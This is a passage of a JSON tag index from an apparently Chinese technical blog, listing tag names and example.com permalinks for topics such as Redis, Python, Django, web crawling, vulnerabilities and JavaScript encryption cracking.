lug":"面试题","permalink":"http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"redis","slug":"redis","permalink":"http://example.com/tags/redis/"},{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"},{"name":"Pycharm","slug":"Pycharm","permalink":"http://example.com/tags/Pycharm/"},{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"Http","slug":"Http","permalink":"http://example.com/tags/Http/"},{"name":"Js加密破解","slug":"Js加密破解","permalink":"http://example.com/tags/Js%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"},{"name":"eval","slug":"eval","permalink":"http://example.com/tags/eval/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"requests","slug":"requests","permalink":"http://example.com/tags/requests/"},{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"win10","slug":"win10","permalink":"http://example.com/tags/win10/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"项目","slug":"项目","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE/"},{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"},{"name":"Jquery","slug":"Jquery","permalink":"http://example.com/tags/Jquery/"},{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"需求工程","slug":"需求工程","permalink":"http://example.com/tags/%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B/"},{"name":"SSM","slug":"SSM","permalink":"http://example.com/tags/SSM/"}]}